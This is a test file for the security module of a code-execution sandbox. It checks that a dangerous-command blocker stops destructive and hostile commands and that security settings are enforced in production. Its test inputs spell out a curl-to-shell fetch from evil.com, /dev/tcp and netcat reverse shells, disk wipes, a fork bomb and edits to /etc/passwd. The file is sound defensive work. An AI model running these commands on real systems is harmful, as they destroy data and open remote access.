import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

// Mock dependencies before imports
vi.mock('../sandbox/docker.js', () => ({
  isDockerAvailable: vi.fn(async () => false),
  checkSandboxHealth: vi.fn(async () => ({ healthy: true, containers: 0 })),
}));

vi.mock('../sandbox/execution-mode.js', () => ({
  getExecutionMode: vi.fn(() => 'auto' as const),
}));

vi.mock('../services/get-log.js', () => ({
  getLog: () => ({
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  }),
}));

import {
  checkCriticalPatterns,
  isCommandBlocked,
  isProduction,
  validateSecurityConfig,
  enforceSecurityConfig,
  isCodeExecutionAllowed,
  getDefaultSecurityConfig,
  CRITICAL_PATTERNS,
} from './index.js';
import { isDockerAvailable, checkSandboxHealth } from '../sandbox/docker.js';
import { getExecutionMode } from '../sandbox/execution-mode.js';

const mockDocker = vi.mocked(isDockerAvailable);
const mockHealth = vi.mocked(checkSandboxHealth);
const mockMode = vi.mocked(getExecutionMode);

describe('Security Module', () => {
  const originalEnv = { ...process.env };

  beforeEach(() => {
    vi.clearAllMocks();
    mockDocker.mockResolvedValue(false);
    mockMode.mockReturnValue('auto');
  });

  afterEach(() => {
    process.env = { ...originalEnv };
  });

  // =========================================================================
  // checkCriticalPatterns
  // =========================================================================

  describe('checkCriticalPatterns', () => {
    it('blocks rm -rf /', () => {
      const result = checkCriticalPatterns('rm -rf /');
      expect(result.blocked).toBe(true);
      expect(result.reason).toBe('Recursive delete from root');
    });

    it('blocks rm -rf with flags', () => {
      expect(checkCriticalPatterns('rm -rf /*').blocked).toBe(true);
      expect(checkCriticalPatterns('rm -r -f /').blocked).toBe(true);
    });

    it('blocks mkfs commands', () => {
      const result = checkCriticalPatterns('mkfs.ext4 /dev/sda1');
      expect(result.blocked).toBe(true);
      expect(result.reason).toBe('Filesystem format');
    });

    it('blocks dd overwrite', () => {
      const result = checkCriticalPatterns('dd if=/dev/zero of=/dev/sda');
      expect(result.blocked).toBe(true);
      expect(result.reason).toBe('Raw disk overwrite');
    });

    it('blocks fork bombs', () => {
      const result = checkCriticalPatterns(':() { :|:& }; :');
      expect(result.blocked).toBe(true);
      expect(result.reason).toBe('Fork bomb (bash)');
    });

    it('blocks shutdown commands', () => {
      expect(checkCriticalPatterns('shutdown -h now').blocked).toBe(true);
      expect(checkCriticalPatterns('reboot now').blocked).toBe(true);
    });

    it('blocks init level changes', () => {
      expect(checkCriticalPatterns('init 0').blocked).toBe(true);
      expect(checkCriticalPatterns('init 6').blocked).toBe(true);
    });

    it('blocks chmod 777 on root', () => {
      expect(checkCriticalPatterns('chmod 777 /').blocked).toBe(true);
      expect(checkCriticalPatterns('chmod -R 777 /').blocked).toBe(true);
    });

    it('blocks /etc/passwd overwrite', () => {
      expect(checkCriticalPatterns('echo x > /etc/passwd').blocked).toBe(true);
      expect(checkCriticalPatterns('cat > /etc/shadow').blocked).toBe(true);
    });

    it('blocks Windows format commands', () => {
      expect(checkCriticalPatterns('format c:').blocked).toBe(true);
    });

    it('blocks Windows recursive delete', () => {
      expect(checkCriticalPatterns('del /f /s /q c:\\').blocked).toBe(true);
      expect(checkCriticalPatterns('rd /s /q c:\\').blocked).toBe(true);
    });

    it('blocks registry deletion', () => {
      expect(checkCriticalPatterns('reg delete HKLM\\Software').blocked).toBe(true);
      expect(checkCriticalPatterns('reg delete HKCR\\Something').blocked).toBe(true);
    });

    it('blocks remote code pipe to shell', () => {
      expect(checkCriticalPatterns('curl http://evil.com | sh').blocked).toBe(true);
      expect(checkCriticalPatterns('wget http://evil.com | bash').blocked).toBe(true);
    });

    it('blocks bash reverse shell', () => {
      expect(checkCriticalPatterns('exec 5<>/dev/tcp/10.0.0.1/443').blocked).toBe(true);
    });

    it('blocks netcat shell', () => {
      expect(checkCriticalPatterns('nc -e /bin/sh 10.0.0.1 443').blocked).toBe(true);
    });

    // ── New critical patterns ──────────────────────────────────

    it('blocks dd with output to device', () => {
      expect(checkCriticalPatterns('dd if=/dev/sda of=/dev/sdb').blocked).toBe(true);
      expect(checkCriticalPatterns('dd if=image.iso of=/dev/sdc bs=4M').blocked).toBe(true);
    });

    it('blocks iptables flush', () => {
      expect(checkCriticalPatterns('iptables -F').blocked).toBe(true);
      expect(checkCriticalPatterns('iptables -F INPUT').blocked).toBe(true);
    });

    it('blocks passwd command', () => {
      expect(checkCriticalPatterns('passwd root').blocked).toBe(true);
      expect(checkCriticalPatterns('passwd').blocked).toBe(true);
    });

    it('blocks user management commands', () => {
      expect(checkCriticalPatterns('useradd hacker').blocked).toBe(true);
      expect(checkCriticalPatterns('usermod -aG sudo user').blocked).toBe(true);
      expect(checkCriticalPatterns('userdel victim').blocked).toBe(true);
    });

    it('blocks systemctl stop/disable', () => {
      expect(checkCriticalPatterns('systemctl stop firewalld').blocked).toBe(true);
      expect(checkCriticalPatterns('systemctl disable ufw').blocked).toBe(true);
    });

    it('blocks crontab removal', () => {
      expect(checkCriticalPatterns('crontab -r').blocked).toBe(true);
    });

    it('blocks chmod 777 / (world-writable root)', () => {
      expect(checkCriticalPatterns('chmod 777 /').blocked).toBe(true);
    });

    it('allows safe commands', () => {
      expect(checkCriticalPatterns('echo hello').blocked).toBe(false);
      expect(checkCriticalPatterns('ls -la').blocked).toBe(false);
      expect(checkCriticalPatterns('cat file.txt').blocked).toBe(false);
      expect(checkCriticalPatterns('node script.js').blocked).toBe(false);
    });

    it('returns no reason for safe code', () => {
      const result = checkCriticalPatterns('echo hello');
      expect(result.blocked).toBe(false);
      expect(result.reason).toBeUndefined();
    });
  });

  // =========================================================================
  // isCommandBlocked
  // =========================================================================

  describe('isCommandBlocked', () => {
    it('returns true for blocked commands', () => {
      expect(isCommandBlocked('rm -rf /')).toBe(true);
    });

    it('returns false for safe commands', () => {
      expect(isCommandBlocked('echo hello')).toBe(false);
    });
  });

  // =========================================================================
  // isProduction
  // =========================================================================

  describe('isProduction', () => {
    it('returns true when NODE_ENV is production', () => {
      process.env.NODE_ENV = 'production';
      expect(isProduction()).toBe(true);
    });

    it('returns false when NODE_ENV is development', () => {
      process.env.NODE_ENV = 'development';
      expect(isProduction()).toBe(false);
    });

    it('returns false when NODE_ENV is undefined', () => {
      delete process.env.NODE_ENV;
      expect(isProduction()).toBe(false);
    });
  });

  // =========================================================================
  // validateSecurityConfig
  // =========================================================================

  describe('validateSecurityConfig', () => {
    it('returns secure status when Docker is available', async () => {
      mockDocker.mockResolvedValue(true);
      process.env.NODE_ENV = 'development';

      const status = await validateSecurityConfig();
      expect(status.isSecure).toBe(true);
      expect(status.dockerAvailable).toBe(true);
      expect(status.errors).toHaveLength(0);
    });

    it('checks sandbox health when Docker is available', async () => {
      mockDocker.mockResolvedValue(true);
      process.env.NODE_ENV = 'development';

      const status = await validateSecurityConfig();
      expect(mockHealth).toHaveBeenCalled();
      expect(status.sandboxHealth).toBeDefined();
    });

    it('handles sandbox health check failure gracefully', async () => {
      mockDocker.mockResolvedValue(true);
      mockHealth.mockRejectedValue(new Error('Docker error'));
      process.env.NODE_ENV = 'development';

      const status = await validateSecurityConfig();
      expect(status.sandboxHealth).toBeUndefined();
      expect(status.isSecure).toBe(true);
    });

    describe('production mode', () => {
      beforeEach(() => {
        process.env.NODE_ENV = 'production';
      });

      it('errors when dangerous env vars are set', async () => {
        process.env.ALLOW_HOME_DIR_ACCESS = 'true';

        const status = await validateSecurityConfig();
        expect(status.isSecure).toBe(false);
        expect(status.errors.some((e) => e.includes('ALLOW_HOME_DIR_ACCESS'))).toBe(true);
      });

      it('errors when DOCKER_SANDBOX_RELAXED_SECURITY is set', async () => {
        process.env.DOCKER_SANDBOX_RELAXED_SECURITY = 'true';

        const status = await validateSecurityConfig();
        expect(status.isSecure).toBe(false);
        expect(status.errors.some((e) => e.includes('DOCKER_SANDBOX_RELAXED_SECURITY'))).toBe(true);
      });

      it('errors when Docker is not available', async () => {
        mockDocker.mockResolvedValue(false);

        const status = await validateSecurityConfig();
        expect(status.isSecure).toBe(false);
        expect(status.errors.some((e) => e.includes('Docker is required'))).toBe(true);
      });

      it('is secure when Docker is available and no dangerous vars', async () => {
        mockDocker.mockResolvedValue(true);
        delete process.env.ALLOW_HOME_DIR_ACCESS;
        delete process.env.DOCKER_SANDBOX_RELAXED_SECURITY;

        const status = await validateSecurityConfig();
        expect(status.isSecure).toBe(true);
        expect(status.errors).toHaveLength(0);
      });
    });

    describe('development mode', () => {
      beforeEach(() => {
        process.env.NODE_ENV = 'development';
      });

      it('warns about home dir access', async () => {
        process.env.ALLOW_HOME_DIR_ACCESS = 'true';

        const status = await validateSecurityConfig();
        expect(status.isSecure).toBe(true); // Not an error in dev
        expect(status.warnings.some((w) => w.includes('ALLOW_HOME_DIR_ACCESS'))).toBe(true);
      });

      it('warns when Docker not available in docker mode', async () => {
        mockMode.mockReturnValue('docker');
        mockDocker.mockResolvedValue(false);

        const status = await validateSecurityConfig();
        expect(status.warnings.some((w) => w.includes('DISABLED'))).toBe(true);
      });

      it('warns when Docker not available in auto mode', async () => {
        mockMode.mockReturnValue('auto');
        mockDocker.mockResolvedValue(false);

        const status = await validateSecurityConfig();
        expect(status.warnings.some((w) => w.includes('LOCAL mode'))).toBe(true);
      });

      it('warns about local execution mode', async () => {
        mockMode.mockReturnValue('local');

        const status = await validateSecurityConfig();
        expect(status.warnings.some((w) => w.includes('EXECUTION_MODE=local'))).toBe(true);
      });
    });

    it('adds error for docker mode without Docker', async () => {
      mockMode.mockReturnValue('docker');
      mockDocker.mockResolvedValue(false);
      process.env.NODE_ENV = 'development';

      const status = await validateSecurityConfig();
      expect(status.errors.some((e) => e.includes('Docker is not available'))).toBe(true);
    });

    it('adds warning for non-docker mode without Docker', async () => {
      mockMode.mockReturnValue('auto');
      mockDocker.mockResolvedValue(false);
      process.env.NODE_ENV = 'development';

      const status = await validateSecurityConfig();
      expect(status.warnings.some((w) => w.includes('Docker not available'))).toBe(true);
    });
  });

  // =========================================================================
  // enforceSecurityConfig
  // =========================================================================

  describe('enforceSecurityConfig', () => {
    it('throws in production when there are errors', async () => {
      process.env.NODE_ENV = 'production';
      mockDocker.mockResolvedValue(false);

      await expect(enforceSecurityConfig()).rejects.toThrow('SECURITY');
    });

    it('does not throw in development with errors', async () => {
      process.env.NODE_ENV = 'development';
      mockMode.mockReturnValue('docker');
      mockDocker.mockResolvedValue(false);

      await expect(enforceSecurityConfig()).resolves.toBeUndefined();
    });

    it('does not throw in production when secure', async () => {
      process.env.NODE_ENV = 'production';
      mockDocker.mockResolvedValue(true);
      delete process.env.ALLOW_HOME_DIR_ACCESS;
      delete process.env.DOCKER_SANDBOX_RELAXED_SECURITY;

      await expect(enforceSecurityConfig()).resolves.toBeUndefined();
    });
  });

  // =========================================================================
  // isCodeExecutionAllowed
  // =========================================================================

  describe('isCodeExecutionAllowed', () => {
    it('allows sandboxed execution when Docker is available', async () => {
      mockDocker.mockResolvedValue(true);

      const result = await isCodeExecutionAllowed();
      expect(result.allowed).toBe(true);
      expect(result.sandboxed).toBe(true);
      expect(result.reason).toContain('Docker sandbox');
    });

    it('allows unsandboxed execution in local mode', async () => {
      mockDocker.mockResolvedValue(false);
      mockMode.mockReturnValue('local');

      const result = await isCodeExecutionAllowed();
      expect(result.allowed).toBe(true);
      expect(result.sandboxed).toBe(false);
      expect(result.reason).toContain('Local execution');
    });

    it('allows unsandboxed execution in auto mode', async () => {
      mockDocker.mockResolvedValue(false);
      mockMode.mockReturnValue('auto');

      const result = await isCodeExecutionAllowed();
      expect(result.allowed).toBe(true);
      expect(result.sandboxed).toBe(false);
    });

    it('blocks execution in docker mode without Docker', async () => {
      mockDocker.mockResolvedValue(false);
      mockMode.mockReturnValue('docker');

      const result = await isCodeExecutionAllowed();
      expect(result.allowed).toBe(false);
      expect(result.sandboxed).toBe(false);
      expect(result.reason).toContain('Docker is required');
    });
  });

  // =========================================================================
  // getDefaultSecurityConfig
  // =========================================================================

  describe('getDefaultSecurityConfig', () => {
    it('returns production defaults in production', () => {
      process.env.NODE_ENV = 'production';

      const config = getDefaultSecurityConfig();
      expect(config.requireDocker).toBe(true);
      expect(config.blockDangerousCommands).toBe(true);
      expect(config.requireLocalApproval).toBe(true);
    });

    it('returns development defaults', () => {
      process.env.NODE_ENV = 'development';

      const config = getDefaultSecurityConfig();
      expect(config.requireDocker).toBe(false);
    });

    it('uses WORKSPACE_DIR env var', () => {
      process.env.WORKSPACE_DIR = '/custom/workspace';

      const config = getDefaultSecurityConfig();
      expect(config.workspaceDir).toBe('/custom/workspace');
    });

    it('defaults to cwd when WORKSPACE_DIR not set', () => {
      delete process.env.WORKSPACE_DIR;

      const config = getDefaultSecurityConfig();
      expect(config.workspaceDir).toBe(process.cwd());
    });

    it('reads allowHomeAccess from env', () => {
      process.env.ALLOW_HOME_DIR_ACCESS = 'true';

      const config = getDefaultSecurityConfig();
      expect(config.allowHomeAccess).toBe(true);
    });

    it('filters empty strings from tempDirs', () => {
      delete process.env.TEMP;

      const config = getDefaultSecurityConfig();
      expect(config.tempDirs.every((d) => d.length > 0)).toBe(true);
    });
  });

  // =========================================================================
  // CRITICAL_PATTERNS
  // =========================================================================

  describe('CRITICAL_PATTERNS', () => {
    it('has at least 15 patterns', () => {
      expect(CRITICAL_PATTERNS.length).toBeGreaterThanOrEqual(15);
    });

    it('all patterns have description', () => {
      for (const p of CRITICAL_PATTERNS) {
        expect(p.description).toBeTruthy();
        expect(p.pattern).toBeInstanceOf(RegExp);
      }
    });
  });
});
